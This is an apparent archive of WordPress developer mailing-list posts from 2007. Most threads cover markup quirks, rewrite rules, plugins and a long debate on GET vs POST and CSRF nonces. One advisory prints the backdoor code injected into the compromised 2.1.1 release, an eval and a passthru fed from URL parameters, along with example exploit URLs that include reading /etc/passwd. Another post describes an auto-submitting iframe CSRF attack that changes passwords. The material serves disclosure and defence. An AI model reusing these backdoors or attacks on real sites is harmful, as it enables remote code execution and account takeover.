  I'm not sure how the rest of the WP communities responds. I use WP  
mostly for clients looking for simple CMS abilities. I've gone  
through the WP specific demo http://ck-erp.org/wordpress/wp-login.php  
and looked around. Was looking for more details specific to how this  
product, or series of products integrate in WP. Most of the online  
docs mention other systems like Joomlam Drupal, etc. Looking for  
something specific to WP only.

Already fixed.  This is the same bug as in the Secunia advisory.  The  
fix was a different one than advised by Secunia, because Senunia  
misdiagnosed the issue.  It's not that there is an unvalidated  
parameter... it is that the URL itself is spit back out without being  
sanitized.  So any parameter (even made up ones) can be the cause of  
the HTML injection.

Subject: [wp-hackers] p inside blockquote
Message-ID: <6E0A285B-0187-4D7B-81F9-F3C05A0332F0@birdhouse.org>

If you use a <blockquote ... /> in a post,  autop in 2.1.1 will nest  
the quoted content inside a <p> tag within the blockquote. I think  
this is happening in wp-include/formatting.php:

$pee = preg_replace('|<p><blockquote([^>]*)>|i', "<blockquote$1><p>",  
$pee);
$pee = str_replace('</blockquote></p>', '</p></blockquote>', $pee);

There is no XHTML rule that says this should happen. Create a test  
document with a blockquote, without the inner p, and validate it.  
It's fine. Both p and blockquote are block-level HTML elements. Why  
nest one inside the other? This behavior is breaking CSS designs that  
put a vertical rule to the left of a blockquote - suddenly the  
vertical rule is extending above and below the quoted text.

It seems like someone must have added this behavior intentionally,   
but why? I think lines 70&71 in formatting.php should be canned. Or  
is there something I'm not understanding here?

The p element cannot contain block-level elements.

Hi, me again.

It's mostly working the way I want it to. :)

See: http://www.heliosmulti.com/plaplo 

The portfolio page is working correctly and I found 
the way to exclude a page from the wp_list_pages() function. 
Wrote functions similar to these but specific to my plugin and 
it's working pretty well.
 
This time I'm having problems with the mod_rewrite stuff. 
I'm not very familiar with it and I can't get it to work.

I tried hacking my .htaccess to this (I added only the last RewriteRule).

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /plaplo/
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /plaplo/index.php 
RewriteRule ^plaplo/portfolio/category/([A-Za-z0-9-]+)$ /plaplo/portfolio?catslug=$1 [L]
</IfModule>

This should turn
/plaplo/portfolio/category/foobar

into
/plaplo/portfolio?catslug=foobar

right?

Can someone help me on this please.

Thanks,

Pierre-Luc

I'm not suggesting that it should. I'm saying that blockquote can  
stand on its own without any p container, either inside or outside of  
itself. But WP won't let that happen (and this seems to be new  
behavior for WP - my blockquote CSS only broke with a recent update).  
WP is inserting unnecessary HTML that breaks a good number of CSS  
designs, and I'd like for it to stop doing that.

Looks like it's doing this to <div> as well. Enter:

<div>content</div>
and it renders:
<div><p>content</p></div>

Why? div, blockquote, and p are block-level equals. No XHTML rule  
says that content inside a div or a blockquote must be in a p  
container. But WP apparently thinks it must be so.

Why should this:
<div><img src="foo"></div>
be forced to become this:
<div><p><img src="foo"/></div>
???

Tested in 2.1 and 2.1.1

Ah, sorry. That's not really true in XHTML 1.0 Strict, though; a
blockquote can't contain just text:

<http://www.w3.org/TR/xhtml1/dtds.html#dtdentry_xhtml1-strict.dtd_blockquote>

For divs and in Transitional, yeah. The example with the image is pretty bad.

It's not the first time people have had problems with wpautop (if the
behaviour has changed, it was probably to fix it for someone else),
and they're going to keep having problems until someone puts together
a suite of regression tests.

As for the divs, you are right. As for the paragraphs inside
blockquotes, I'm afraid you're wrong, at least considering XHTML 1.1. 

Please have a look at the code at http://pastebin.ca/376807 and try to
validate it through http://validator.w3.org -- you will see, that the
paragraphs are actually required.

Well, I see a reason why p nests inside blockquote. If you have a
quotation that spans more than one paragraph, then would you prefer
repeating p or blockquote? It would seem obvious to repeat p. Whereas,
if you tried repeating blockquote for each paragraph (let's say you're
not using p nested within), then what happens to child elements, cite
and title? Would you repeat them per paragraph?

WordPress is right in nesting p within blockquote. So, if you have one
paragraph, it wouldn't matter, but if you have more than one, then it
does. To me, the default is good. Please don't start thinking of
changing the very basics now. This is one of strengths of WordPress.

A quick test shows that <blockquote>test</blockquote> validates in XHTML
1.0 Transitional, a doctype intended for legacy content in an old
version of XHTML. It does not validate in XHTML 1.0 Strict, the doctype
intended for newly authored content (i.e. such as a WordPress blog), or
XHTML 1.1 (the current version). That's because the Transitional DTD
defines <blockquote/>'s content model as %Flow; not %Block; .

There is of course an element intended for short quotations: <q/>.

However it is true that content inside a blockquote need not be a <p/>.
It might equally be a <div/>, a <table/>, another <blockquote/>, etc.,
and WordPress certainly shouldn't be trying to dump quoted block
elements inside <p/> (if that is what it is doing.)

It's worth bearing in mind that currents drafts of future markup
languages (both WHATWG's HTML and XHTML2) support <blockquote/> inside
<p/>. The inclusion of block quotations within logical paragraphs is
common in books, so this is an unnatural restriction in HTML4.01/XHTML
1.x. How WordPress should handle this with a view to preserving
authorial intent for expression in better markup languages of the future
is open to debate. Internally, it would be good to preserve logical
paragraphs. When a blockquote must be included in a logical paragraph
these logical paragraphs could either be output as:

<p>A normal paragraph (no quotation).</p>
<p>A paragraph with a quotation.</p>
<blockquote><p>The quotation.</p></blockquote>
<p>The paragraph continues.</p>

or

<p>A normal paragraph (no quotation).</p>
<div class="paragraph">A paragraph with a quotation.<blockquote><p>The
quotation.</p></blockquote>The paragraph continues.</div>

Which you prefer depends on which offends your semantic sense more.
Personally I prefer the second, since I'd prefer to imply a generic
block than imply paragraphs that aren't really there.

But since the output is independent of the storage, one could make it a
setting and avoid a heated debate.

Does anyone know how I can use get_posts('category=x'); to get all 
current and future posts? Or can I use another function to do this easily?

For my plugin I want to work on all posts in a given category, both 
published and unpublished.

Cheers - Callum.

Just wondering, but would it be easier to use WP_Rewrite to manage your
rewrite rules, or are you doing this outside of WP?

No, the portfolio page is a WP page with a template, 
inside it I call my own function portfolio_list_categories, 
portfolio_list_projects and such based on what is $_GET.

The database for all data is an additional wp_portfolio_categories
and such.

I wasn't aware of the existence of WP_Rewrite. How would I write 
a WP_Rewrite rule to do something like that?

Thanks

I believe (and I may be completely wrong) that the problem is the
placing of the Rewrite rule. I believe that the rules are consecutive
- i.e. a rule at the bottom will be acting on the result of the rules
above.

Try adding...

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /plaplo/
RewriteRule ^plaplo/portfolio/category/([A-Za-z0-9-]+)$
/plaplo/portfolio?catslug=$1 [L]
</IfModule>

....into your .htaccess file *above* everything else.  If this works
the solution is simply to open .htaccess on plugin install and dump
this at the top of the file (read it in, output this, then output what
you read).  You may want to flag & check obviously with suitable
.htaccess comments.

If you need more help I'm happy to do so

That's what I thought at first but it's not that. I'm thinking going
the wp_rewrite route, if it can exclude indivudual pages and do 
stuff like that. I'll look the WP_Rewrite function reference tonight
when I'll be back from a reunion. 

If someone knows how to do it wp_rewrite, t'would still be nice to send
the answer. :)

OK, so we've got a bunch of variables here:

- The rules  change depending on the doctype (blockquote switches  
from  block element to flow element in strict). But doctype is  
unknown (stored in the template / user controllable), so WP can't  
know it in advance in order to do the right thing. So we want a rule  
for this that works as well as possible for all doctypes.

- While a p inside blockquote probably shouldn't  be enforced for a  
single block of text, it makes good sense for multiple paragraphs in  
a blockquote. We probably don't want to try and parse text that  
finely (i.e. we don't want to try and determine how many paragraphs  
there are in a blockquote before rendering it), so we need a single  
rule that works in all cases.

-  p, div, and blockquote should be treated  differently. They're  
similar, but not the same. While it might make  sense to enforce p  
inside blockquote for  text for several reasons, it doesn't make  
sense to force p inside div for an image or other arbitrary HTML.

Hairy stuff - no wonder fixing one thing breaks another. I'm not sure  
how to proceed. Should I file a ticket covering all of this, or file  
more than one ticket, or go home with my marbles intact and leave

On second look the Rewrite Rule itself is broken:

RewriteRule ^plaplo/portfolio/category/([A-Za-z0-9-]+)$
/plaplo/portfolio?catslug=$1 [L]

Should be:

RewriteRule ^plaplo/portfolio/category/([A-Za-z0-9]+)$
plaplo/portfolio?catslug=$1 [L]

Note that you have an additional "-" at the end of the URL definition
and an additional "/" at the beginning of the destination URL. That
"/" is only required for a rule which redirects (put a "R," in the
bracket at the end ( ie. [R,L] ) and you'll see what the rewrite is
doing.

Can't help with WP_Rewrite but here is some info:

Unforfunately that ain't doing anything either. 
I'll read up the wp_rewrite documentation and try
to get something out of it.

To me, it seems like you should aim for a strict doctype, since it would 
still validate as transitional.  Sounds like there might be some 
templates that need their CSS touched up, but complying with strict 
standards is a step forward in my opinion.

newbie question, sorry - can I ask why using GETS rather than POST? When 
i have written my own php stuff I use post almost exclusively.. is it so 
that the BACK browser button behaves better?
thanks

No, it doesn't peacefully degrade for user agents without JS or with
JS disabled.

Nor does POST *without* nonce protect you from XSS because people can
always set up hidden forms posting to your WP installation in a hidden
frame automatically using Javascript on their own site.

We've been down this road before. Believe it or not the answer seems to 
be so WP can style the buttons and links a certain way, nothing more.

It really is broken, and is going to continue to be a cause of security 
holes, but I have personally despaired of this being fixed short of a fork.

How does switching to POST over GET remove the possibility of security 
holes?  They are both just as exploitable from a security point of view 
if they are not given protection.

Nonces are the best form of protection that we can give either of these 
methods.

GET is supposed to be a safe operation. Users are supposed to be able to 
follow links without worrying about doing things. In WP, they can't. 
This leads to various XSS issues and cracks. It's too easy to get the 
admin to follow a link, Indeed this can happen without any explicit user 
request at all.

POST is not which is why it can't be linked to, bookmarked, prefetched, 
used to grab an image, etc.

The issue of using JavaScript to POST without user intervention is an 
interesting question. I need to explore it further. I'm not sure it's 
possible, but I'm not sure it isn't either. I suspect the answer may lie 
in which servers the JavaScript is allowed to talk to, but I'm not a 
JavaScript expert so I'm not yet sure.

Actually that's partially wrong, at least in XHTML strict. A blockquote 
must contain block-level elements such as div or p. It cannot validly 
contain raw text. I.e. this is invalid:

<blockquote>foo</blockquote>


However this is valid:

<blockquote><p>foo</p></blockquote>


as is this:

<blockquote><div>foo</div></blockquote>

The relevant declarations are

<!ELEMENT blockquote %Block;>
<!ENTITY % block
      "p | %heading; | div | %lists; | %blocktext; | fieldset | table">
<!ENTITY % Block "(%block; | form | %misc;)*">

Raw unparented PCDATA isn't allowed in a blockquote.

However in XHTML transitional this changes. Here the content model for 
blockquote is different:

<!ELEMENT blockquote %Flow;>

Thus raw unparented PCDATA is allowed in a blockquote, so it depends on 
which DTD you're using.

Interestingly in HTML 4.0.1 the raw data is not allowed:

<!ELEMENT BLOCKQUOTE - - (%block;|SCRIPT)+ -- long quotation -->

So this is a rare case in which XHTML Transitional is less strict than 
classic HTML, not more.

Yes but if I can convince you to click on a link that takes you to your 
blogs admin then I can just as likely convince you to click on a form 
post button that does the same.

That is why both methods _need_ the nonces (or something else like 
referrer checking which isn't as good as the nonces) to prevent the XSS 
issues and cracks.

Switching to POST from GET does not protect against the issues - it just 
makes them slightly harded to exploit - i.e. you can't easily exploit a 
POST issue without user interaction which you can with a GET issue by 
virtue of using an IMG tag to perform the exploit.

I don't see this as relavent to the issue at hand really.

POST is not more secure than GET.

Believing so leads to a false sense of security.

The difference is you don't need to convince me to click on a link. You 
can force my browser to follow a link in several ways without any human 
intervention. That isn't the case with POST, I brought up the JavaScript 
because it had been suggested that could be used to force a POST without 
  human intervention. I'm not sure that's true but it's worth investigating.

There are some restrictions on exactly who XmlHttpRequest can POST to. 
In particular at the default security level it can only POST back to the 
site from which the script came.

However there's something in JSON that allows at least occasional 
tunneling around that. As I said, I'm not a big JavaScript person so I'm 
not sure if this is or isn't bulletproof, or exactly how it applies 
here. More research is needed.

See

http://www.25hoursaday.com/weblog/PermaLink.aspx?guid=060ca7c3-b03f-41aa-937b-c8cba5b7f986
http://www.xml.com/pub/a/2005/11/09/fixing-ajax-xmlhttprequest-considered-harmful.html

I *think* the net effect here is that site foo cannot post a form that 
includes my authentication cookies to site bar without me explicitly 
pushing a button. If there is a way to hack around this, I think it 
would be classified as a security bug by browser vendors, and would be 
fixed.

Hello everyone.

If anyone is running 2.1.1, or knows someone who is, I would recommend 
upgrading to 2.1.2 as soon as possible. It is now available at 
http://wordpress.org/download/

The md5 of the tar.gz is b1ae0c152e60300cba8c40c030baafd4.

No announcement quite yet, but coming soon. Thanks for your help.

<form name="bar" target="foo" method="post"

1. You can certainly post to a form outside your domain.
2. You can hide the form as well.
3. You can automated it via Javascript.
4. POST is about as insecure as GET

Good to see the i18n of wp-admin/edit.php. We still need someone to do the
same for wp-admin/edit-comments.php, though. We should bear that in mind for
next release. I'm afraid I wouldn't now what to do, but for someone with the
skills, I believe it to be rather easy?

Ryan, are you preparing a 2.1.2 POT?

I'll probably be away for a couple of days now, so I'd like to announce WP
2.1.2 da_DK before leaving in about an hour. We're having a hands-on meetup
on Sunday and it would be a pity not to have 2.1.2 ready for that. All I
need now is the POT and I would rather use yours than a home made :-)

Any idea when you would be announcing the release? I'd just make a
to-be-published post and have it published about an hour after you suggest
to have the official announcement up.

To make a long story short, POST or GET does not matter. Both actions
must be protected by nonces, period. And as far as I know, in the
administration panel, both actions are protected by nonces.

The answer to the original question is also no, because it would not
peacefully degrade, that particular solution cannot be used, and is
also essentially useless from a security standpoint.

For GET vs. POST and safe following of links, nowhere is it stated
that GETs in links are intended to not have side effects. There is a
recommendation that they do not, but it is not a requirement, nor
would it be enforceable if it was. There is no reason that a link that
is clearly labeled in the administration panel to point to an action
that is intended to delete something should not be allowed. If we're
not sending the right caching headers to comply with the
recommendations of the HTTP specification, then I suggest we change
that. Otherwise, I see absolutely no problem with using links to
perform operations.

That was mostly a rhetorical question. What I really want to know is
"why bypass the normal testing process?" Even greatly accelerated
community testing is better than no community testing.

I can only assume it was a pretty major security flaw that they didn't
want any diffs of floating around before release.

Have you really not seen any of the numerous places where this has been 
stated? See for example, section 9.1 of the HTTP 1.1 specification:

http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.1

Also see section 3.4 of Architecture of the World Wide Web, Volume One:

http://www.w3.org/TR/webarch/#safe-interaction

and

URIs, Addressability, and the use of HTTP GET and POST
http://www.w3.org/2001/tag/doc/whenToUseGet.html

Please review the above references which explain in detail why "a link 
that is clearly labeled in the administration panel to point to an 
action that is intended to delete something should not be allowed."

You mean like the security holes that are being exposed every week or 
two? Sooner or later, you have to realize that they're not isolated 
incidents. There's an architectural problem here.

Sure, I can understand that. But those changes are going to be out
there and the flaw will be public as soon as any release is made. If
the flaw is big, then by all means push it out quickly. But if even a
half day's public testing could prevent a 2.1.3 next week, doesn't
that better serve the community and the WP brand?

Hey the blog post is out:

Someone else has already pointed you to the W3C's resources.  One
nitpick I have is that idempotency of GET requests ACTUALLY means:
"If this request is issued X times, it is equivalent to being issued 1
time."  That means a GET request (per W3C's recommendations) can have
a side-effect, provided that the side-effect does not accumulate.  So,
"delete post id 13" would be idempotent even though it affects state,
but "delete most recent post" would not be.  However, it's generally
good practice to make GET requests completely side-effect-free.

I know that POST is no more operationally secure than GET, but I have
a few thoughts on the issue:
1) POST protects users from nosy sysadmins reading their web server
logs.  Most web servers don't log POST content, for good reason.
2) State-altering requests should be sending a HTTP 302 redirect
instead of displaying a page directly.  That way, when a use navigates
with back/forward buttons on the browser, the state-altering request
is skipped (because the browser remembers that it issued a redirect).
Nonces and security aside, using "POST -> redirect -> GET" instead of
"GET -> GET (with side-effects)" is a better idea from a usability
standpoint, since it plays nicer with web browsers.
3) Web spiders know the difference between GETs and POSTs.  I once had
a public-facing web application that would queue up music to be played
in my house - Googlebot got to it and queued everything up because I
was using links instead of POST forms.  If Wordpress really wants to
move to a broader CMS category, it will likely end up in a situation
*somewhere* down the line where someone decides to spider it.  While
it likely won't hit the admin interface with links to delete things,
it's just a bad habit to get used to using links (which will get
crawled) where POST forms are more appropriate.

I think there is a clear difference between SHOULD NOT and MUST NOT.
You seem to imply that it must not be done. I said it isn't intended
that they are not to have side-effects, which is quite clear by the
fact that GET is a method used for form data submission, if there were
supposed to be no side-effects, it would have never been designed that
way. The idempotence bit is, to me, clear admission that non-safe
interactions can and will happen.

This I have admittedly never seen. Never even knew that this
recommendation existed. I'll rethink all this, but in the mean time

Sooner or later, you'll look at what the vulnerabilities actually are
and realize that this whole discussion really has nothing to do with
the vulnerabilities at hand. Regardless of POST or GET, these
vulnerabilities would have existed. POST is NOT a form of protection
against XSS, CSRF, etc. in any way, and more importantly these
vulnerabilities can be exploited through POST, for example when
writing a new post/page, the same lack of sanitization exists.

I can see an argument for moving on a strictly "we must comply with
every standard and recommendation that is written" standpoint, that I
am fine with. But don't try to pass off the need for a strict
interpretation of everything as a security must. That's completely
wrong.

I believe this is fixed in SVN. If you want I can dig up the ticket.

Better yet, it would be nice if you could try this in SVN, as my memory may
be failing ;).

This sounds like a _really_ bad reason to do so. (Perhaps even against
WP's philosophy?)
It is really not hard to style a <button> or <input> like a link:

	input[type=submit], input[type=button], input[type=reset],
	button {
		border: none;
		background-color: transparent;
		font-family: inherit;
		color: blue;
		text-decoration: underline;
	}

It is not going to eliminate security holes. Even on POST forms, you
still need the nonce:

	<input type="hidden" name="nonce" value="_deadbeef" />

But with the POST forms, at least it stops a rogue prefetching program
like Google Web Accelerator from randomly deleting posts/comments.

Well, I have to admit GWA isn't a problem anymore, as it's hardcoded not
to prefetch links that contain a '?' in them. Apparently, Backpack users
complained of things disappearing by themselves, and they narrowed down
the cause to GWA.

My blog is actually running on a live copy of the 2.1 SVN branch.
I have set up a daily cronjob on my server to run 'svn up' on my working
copy running my blog checked out from
'http://svn.automattic.com/wordpress/branches/2.1'.

I haven't done a manual upgrade of a WordPress install for 6 months. Bliss.

Perhaps the bug has been fixed in trunk, but not the 2.1 branch.

Underline.  Highlight.  Gold star.

This comes up again and again.  POST does not protect against CSRF.   
POST cannot constitute verification of intention because people can  
force you to POST (JavaScript) or trick you into POSTing.  Nonces  
exist to protect against CSRF, against unintentional authorized  
actions.  They verify intention, because they pass along a piece of  
information that you'd only have if you were making the request from  
an authorized page.

Nonces are here to stay.  For GET and POST alike.

For more on Nonces any why they are necessary, read:

The links, the Meta section, the link "Login" to /wp-login.php

It is always "Login", although I am logged in (at least when I'm logged
in as admin).

In previous versions when I was logged in it says "Administration"

a little bug or a feature?

no more.

No, I don't think they can, at least not with authentication cookies 
intact and the default security level in the browser. If this is wrong, 
then it's a browser bug that needs to be reported and fixed.

> or trick you into POSTing.  

I don't think they can trick me into POSTing. Possibly they can trick 
some people. However I am worried that they can trick or force me to 
GET. It's much easier to sneak a GET into the WP admin area than a POST. 
  Pingbacks, links in comments, probably a few other things can all put 
GETtable links in front of me that look normal.

In other words it's a somewhat less spoofable, less blockable referer 
header. That's actually the clearest definition I've heard yet. Thanks.

It may be reasonable to have both, especially if you believe it is 
possible to trick some people into POSTing. (That's probably the case.) 
However nonces are not a full solution either. They have failed to 
protect WordPress from some of the vulnerabilities uncovered in the last 
few months. They do nothing to  avoid the problem of a web accelerator 
prefetching links, and they may  be stealable from code that sneaks 
inside the admin interface.

The bottom line is that unsafe operations should not be done without 
user involvement. the way in which browsers determine what is and is not 
safe is by seeing whether it's submitted with GET or POST. Browsers and 
other tools are entitled to assume that all GET operations are safe. 
When a system violates these assumptions, serious problems ensue. These 
problems are mitigated in part only because some tools sometimes take 
extra steps to work around broken, non-conformant servers like 
WordPress. However those workarounds are fragile. They will and do fail.

Automatic POSTing can be done automagically on any webpage using
Javascript.  If you're currently logged into that remote URL your
browser (may) submit your cookies for it along with the data. A form
to do that can be hidden / in a frame. You could even be presented
with a "Submit" button that looks as though it's part of another form.
 Everyone can be tricked.

Of course a GET is slightly easier to set up than this - but slightly
easier is no protection against someone with intent.

The best solution I think.

affects on Wordpress admin.

Web accelerators are bad, bad, bad (bad for web servers, specifically)
but converting links to buttons as suggested will probably solve the
problem for those that choose to use them.  It wouldn't have any
effect on stealability however - but that's a trusted-code issue.

The worst thing about nonces is their name ( see:
http://en.wikipedia.org/wiki/Nonce_%28slang%29 ).

I don't believe this. I've found specific claims to the contrary.

I don't disbelieve it either. Often such claims miss things.

However I would lie to see a specific proof of concept of a JavaScript 
that submits a POST to a 3rd party site with authentication cookies intact.

the purpose of this would be to be able to assign user

This particular incarnation is borrowed from earlier in the thread.
This one does work, however it will more likely than not trigger your
popup blockers. Test it and let it through, though, then remember that
all it takes is clicking a link and your popup blocker won't have a
thing to say.

The following are to help you test it. This sets a semi-random cookie.

Yes, they can, and it was already pointed out earlier on this thread.
It works across sites, cookies are sent along with the POST, and it
works with or without human intervention (without is considerably
harder, but is quite possible, especially targetting the IE crowd).
However, tricking you is nothing more than tricking you to click a
link on another site. A clever commenter could include a link to an
article of relevance on his own site, in which a link appears to be a
link to further information in context but actually submits a form
back to your own site.

Easier, yes, but the fact remains that switching to POST does not make
it impossible and so why waste our time switching it for that purpose.

I wish you would do like I asked before and actually go look at the
vulnerabilities. The only admin XSS related vulnerabilities we've had
are (a) a lack of nonces where they should be. This isn't a flaw in
nonces, its our fault for not auditing the admin area completely. (b)
The recent XSS which is actually a flaw in the nonce confirmation
dialog, not with nonces.

With the most recent vulnerability fixed in 2.1.1, you should not see
these problems again. The nonce system works exactly the way it was
intended to work.

The only issue of this sort that has occured in recent history is the
short period of time that GWA prefetched links like this, however, the
decision was reversed due to thousands of other pieces of software
having issues with these links being prefetched.

There comes a point where widespread acceptance of something, whether
it be for or against standards, is so widespread that these arguments
no longer work. This kind of stuff is everywhere, and just like old
broken non-compliant HTML, its not going anywhere, ever.



Regardless of any of this, the fact remains that, POST provides no
necessary benefit to security. It makes it a fraction harder, however,
anybody with the intent to get around the limitations of POST will do
so. Nonces are here to stay, and I really think that if you want to
switch everything to POST buttons, it needs to be done in another
thread and security left out of the arguments for it.

That's the most famous example. It's hardly the only one. For example 
see this:

http://www.thedailywtf.com/forums/65974/ShowPost.aspx

Or consider any personal spider like wget.

There are many other cases. Web clients are well within their rights to 
expect GET to be a safe operation.

HTTP is designed to work a certain way. If you ignore its architecture, 
the best you can hope for is a complicated, messy system full of hacks 
that barely holds together and is increasingly hard to maintain and 
modify over time. The worst you can expect? See the above the link.

Go to http://believe.ranta.info/
Type in some text, submit
Go to http://believe.blogpara.de/
Type in some text, submit
Go back to the first page.
See the text you typed on the second one there too.

Read the sources at http://believe.ranta.info/ and
http://believe.blogpara.de/index.phps

And really, it would be very easy to make the second page send a post
without you doing anything at all (except visiting it with JS
enabled). POST does not protect you  from anything except maybe using
your back button.

Greetings.

1. This requires user action. It doesn't happen automatically.

2. There don't seem to be user authentication cookies involved.

3. It didn't actually work. The text I typed on the 2nd page was not 
echoed back on the first, even after I reloaded it.

Maybe it works in some browsers and not others?

after reading this thread:

http://wordpress.org/support/topic/108512?replies=2

I was thinking it might be a good idea to enlist the technically-inclined wp 
community to set up honey pots with the comprimised 2.1.1 code.

This means using htaccess redirects to a page (e.g. wordpress.org/honeypot.php) 
that contains a script that will log the visit - IP/domain/geo info, etc.  This 
way all the world cd see who is attempting to exploit the compromised code.

any thoughts?

The only reason it requires action is because I was lazy and basically
copied one file to 2 locations and added something. The JS that
submits the second form is fired when you submit the form. I could
just as easy fire it on page load or on mouseover (for any element).

> 2. There don't seem to be user authentication cookies involved.

There are session cookies involved. Your browser doesnt know
"authentication cookies" anyhow. A cookie is a cookie is a cookie. All
your browser knows is a) the content (remember, to KNOW is not TO
UNDERSTAND), where it is allowed to send it (which is where it came
from) and when the cookie expires. Your browser does not care if it
contains login information, a random string or an actual cookie
recipe.

Which browser did you test it with? It works fine here in IE7 and FF2.
Did you have JS and Cookies enabled? And you did use the same browser
for both pages, right?

> Maybe it works in some browsers and not others?

If it does not work in some browsers now I am pretty sure that's
because I coded it in ~ 10 minutes.
The basic principle is the same in every browser. JS is allowed to
manipulate the DOM and call functions on DOM nodes. FORM nodes have a
submit() function and a target attribute, so with JS you can create
forms with as many inputs as you want and with every values you want
and you can submit them. As well you can create hidden iframes and
make your form submit into such an iframe. Since there are several
events that you can hook into you can do so (for example) on page
load, when the user types something into an input, when he points the
mouse at an element, when he clicks something and on some more events.
I am using JavaScript every day at work, I know what I am talking about.

As has been stated before: POST is not more or less secure than GET
when it comes to CSRF.

Timo.

No.  User levels are deprecated and are only present for backwards  
compatibility reasons.  A user is defined by his or her  
capabilities.  You cannot assume that a particular role will exist or  
that it will be more capable than any other role... you have to look  
at capabilities.

One way it could be done is to give a special capability that allows  
someone to edit users who lack that capability or the "edit_users"  
capability.  I think I've done that before, within a plugin.  You  
could also provide an array of caps that such users can't assign,  
like edit_options.  For full security, you wouldn't want them to be  
able to post any unfiltered HTML or edit any PHP files, because these  
could be used to escalate their capabilities.

Elliotte,

The above will submit the form on load, to a third party site, with  
cookies intact.  In the run-up to the nonces solution, I was able to  
write a script that, if passed a WP install URL, did the following:

1. spawned 10 different hidden iframes with incrementing user ids (1  
through 10)
2. each iframe contained a script that printed a user's WP profile  
page form with a new password
3. each of the 10 forms auto-submitted

The results was that if a user of the site went to the URL (note, a  
GET URL) and their user ID on that site was from 1 to 10, their  
password would be changed.  Since THEY were the ones who submitted  
the form, they'd get the new login cookie.  So they probably wouldn't  
even notice that their password had been changed, as they could still  
access wp-admin in their main browser.  The script could have easily  
immediately tried to use the password.  It could have then grabbed  
that blog's blogroll and submitted CSRF URLs as trackbacks to those  
friendly sites, which, if clicked, would compromise them as well.

Yes.  Less spoofable, and works through proxies and on UAs that don't  
send referers.  It verifies that the request comes from within WP.

Most of the WP vulnerabilities uncovered in the last few months have  
been XSS, SQL injection, or PHP bugs.  Nonces have effectively closed  
off CSRF bugs, which is what they were meant to do.

Message-ID: <196d50d70703041329w7745407fk753b376a797fa745@mail.gmail.com>

Hi folks,

I'm looking for feedback & thoughts on a Wordpress implementation of a
site throttle.  It's inspired by the system included in Drupal by
default, although it uses a different method to calculate site load &
shares no code.

Externally the plugin it provides an API to monitor and report current
load to plugins or themes, allowing them to limit non-essential
elements until load reduces. In doing this it limits the effect of
traffic peaks on your server's performance.

Currently it is developed as a plugin and provides interface for
configuration and status monitoring as required.  I personally would
like to see this sort of functionality as part of Wordpress as default
(similar to Drupal) but one step at a time.

You can get download / information at:
http://www.mutube.com/projects/wordpress/throttle/

Look forward to hearing what you all think,

Martin

Subject: WordPress source code compromised to enable remote code execution

While assessing the security of WordPress, a popular blog creation software,
I have discovered that it's source code has recently been compromised by a
third party in order to enable remote command execution on the machines
running affected versions. The compromised files are wp-includes/feed.php
and wp-includes/theme.php. 
The following code has been added:


in wp-includes/feed.php

function comment_text_phpfilter($filterdata) {
       eval($filterdata);
}

...

if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }


in wp-includes/theme.php

function get_theme_mcommand($mcds) {
       passthru($mcds);
}

...

if ($_GET["iz"]) { get_theme_mcommand($_GET["iz"]); }


this would enable remote command execution on machines running compromised
versions, for example

http://wordpressurl/wp-includes/feed.php?ix=phpinfo();
http://wordpressurl/wp-includes/theme.php?iz=cat /etc/passwd


I have discovered this vulnerability on Friday, March 2nd 2007 and contacted
WordPress about it straight away. They reacted promptly by disabling
downloads until further investigation. Later they determined that ony one of
two servers has been compromised and that the two files mentioned above are
the only ones changed.

It seems that the above files were changed on Feb 25th, 2007, so if you
downloaded WordPress between Feb 25th, 2007 and Mar 2nd 2007 it is possible
that you are running a compromised version, so be sure to check for the
above code.

Message-ID: <45EB6DA9.30704@callum-macdonald.com>

G'day,

I'm writing a plugin that updates a custom field on all posts in a given 
category, both published and unpublished posts, with past or future 
dates. I can't find a way to get the get_posts() function to retrieve 
posts that don't currently appear on the blog. That makes sense given 
that get_posts() is a template function.

I can't find an alternative function, nor can I figure out where 
wp-admin/edit.php gets the list of posts. I figure it could be the wp() 
function, but I can't find any documentation on the codex (probably on 
account of how often the letters wp are used).

Can anyone suggest how to approach this?

Cheers,


Callum.

Message-ID: <1173063624.m2f.29508@www.galleryembedded.com>

As part of the WPG2 plugin we add a few custom tags in the format of <wpg2>.  Upto WP 2.1 we extended the valid elements in TinyMCE by adding the required tags -> $valid_elements .= 'wpg2,wpg2id';

However in WP 2.1.2 I noticed the following..

When entering  <WPG2ID> 323 </WPG2ID> tags (Without any spaces of course) in the visual tab of tinymce when you switch to the code view the entry is incorrectly translates into &lt;wpg2id&gt;323&lt;/wpg2&gt;

Is anyone else using custom HTML tags and noticed this behaviour or better still getting the correct behaviour in WP 2.1.2?

get_posts is, IIRC, a template tag, so it wouldn't have capabilities to
fetch "hidden" (private, drafts, etc.) posts.

I would recommend a direct SQL query.

Hi Robin,

get_posts() is a template tag, thanks for the confirmation though, I'll 
whip up an SQL query.

Cross-posted to hackers and testers.

Trac has been very active lately with lots of reports and patches
coming in.  I think a Bug Hunt is in order.  What's a good time for
everyone?  We usually do it for 24 hours on a Wednesday starting at
1AM UTC.  Is that okay?  Should we try for the weekend?  Our one
weekend bug hunt wasn't heavily attended, perhaps because Saturday
offers more pleasant preoccupations than fixing and reporting bugs.
But, we could give it another try.

If you need any references, the admin pages would be good. Also beware of
legacy columns that don't do anything.

Usually you will find a link to the author's website in the plugin's
description.

The problems you're talking about: Are they with the WordPress core, or
do you mean some plugins' admin pages?

I guess Sabin meant the administrators of wp-plugins.net.  The last time I looked, that was still

Nothing like answering my own post..  The issue is not within the valid elements array, the issue is if you manually type in any valid tag (ie strong) you get the same issue, the tag is mangled when you switch to code view and the tag effect does not take place.

Hi Sabin,

I had the same issue with two plugins. The author's sites are dead, so 
the plugins are no longer hosted, and the author's email is no longer 
live. I tried to take over the hosting, asked the admin to point the 
download link to a new url, but he wasn't very keen. Suggested I create 
a new version of the plugin under a different name (Plugin Plus, etc). I 
might still do that.

Good luck,


Callum.

Sounds good to me.   This Tuesday/Wednesday seemed to work for enough
people to make it worthwhile, so I went ahead and announced.  Ya'll
spread the word to your readers if you like.

============================================================================
=====

Shouts to the VirtuaX Crew & Community!
Special thanks go out to R4N01 for noticing the XSS!

============================================================================
=====



I. Background
-------------

"WordPress is a state-of-the-art semantic personal publishing platform with
a 
 focus on aesthetics, web standards, and usability. "
                                                             by
wordpress.net

 
II. Vulnerablity
----------------

